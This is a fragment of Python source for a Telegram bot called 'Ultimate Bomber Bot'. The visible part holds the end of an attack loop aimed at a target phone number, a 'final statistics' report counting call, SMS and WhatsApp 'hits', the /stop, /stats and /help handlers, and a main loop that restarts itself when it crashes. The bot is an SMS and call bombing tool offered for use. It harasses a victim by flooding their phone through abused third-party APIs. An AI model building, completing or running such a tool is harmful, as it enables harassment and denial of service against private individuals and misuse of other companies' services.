                        message_id=message_id,
                        text=status_text,
                        parse_mode="HTML",
                        reply_markup=create_stop_keyboard()
                    )
                except Exception as e:
                    logger.error(f"Failed to update message: {e}")
                
                # Check if we should stop
                if stop_signals.get(user_id, False):
                    break
                    
                # Wait for next cycle
                await asyncio.sleep(delay)
                
            except Exception as e:
                logger.error(f"Attack error for user {user_id}: {e}")
                await asyncio.sleep(5)  # Wait before retry
    
    # Attack stopped
    final_stats = attack_stats.get(user_id, {})
    calls = final_stats.get('Call', 0)
    sms = final_stats.get('SMS', 0)
    whatsapp = final_stats.get('WhatsApp', 0)
    total = calls + sms + whatsapp
    
    final_text = f"""
🛑 <b>ATTACK STOPPED</b>

<b>Target:</b> <code>{phone}</code>
<b>Total Cycles:</b> {cycle_count}
<b>Duration:</b> {time.time() - attack_info['start_time']:.1f}s

📊 <b>FINAL STATISTICS:</b>
<b>📞 Calls:</b> {calls}
<b>📩 SMS:</b> {sms}
<b>💬 WhatsApp:</b> {whatsapp}
<b>🔥 Total Hits:</b> {total}

<b>Status:</b> ✅ COMPLETED
<b>Time:</b> {time.strftime('%H:%M:%S')}
    """
    
    try:
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=message_id,
            text=final_text,
            parse_mode="HTML",
            reply_markup=create_main_keyboard()
        )
    except:
        pass
    
    # Clean up
    if user_id in stop_signals:
        del stop_signals[user_id]
    if user_id in user_attacks:
        del user_attacks[user_id]

@dp.message(Command("stop"))
async def stop_command(message: types.Message):
    """Handle /stop command"""
    await stop_attack(message)

@dp.message(Command("stats"))
async def stats_command(message: types.Message):
    """Handle /stats command"""
    await check_stats(message)

@dp.message(Command("help"))
async def help_command_handler(message: types.Message):
    """Handle /help command"""
    await help_command(message)

@dp.message()
async def handle_other_messages(message: types.Message):
    """Handle other messages"""
    if message.text:
        await message.answer(
            "❓ <b>Unknown command!</b>\n\n"
            "Use /help to see available commands or use the buttons below.",
            reply_markup=create_main_keyboard(),
            parse_mode="HTML"
        )

async def main():
    """Main function to start the bot"""
    logger.info("Starting Ultimate Bomber Bot...")
    logger.info(f"Developer: {DEVELOPER_ID}")
    logger.info(f"Loaded APIs: {len(ULTIMATE_APIS)}")
    
    try:
        # Start polling
        await dp.start_polling(bot)
    except Exception as e:
        logger.error(f"Bot crashed: {e}")
        logger.info("Restarting in 5 seconds...")
        await asyncio.sleep(5)
        # Restart
        await main()

if __name__ == "__main__":
    # Run the bot
    asyncio.run(main())
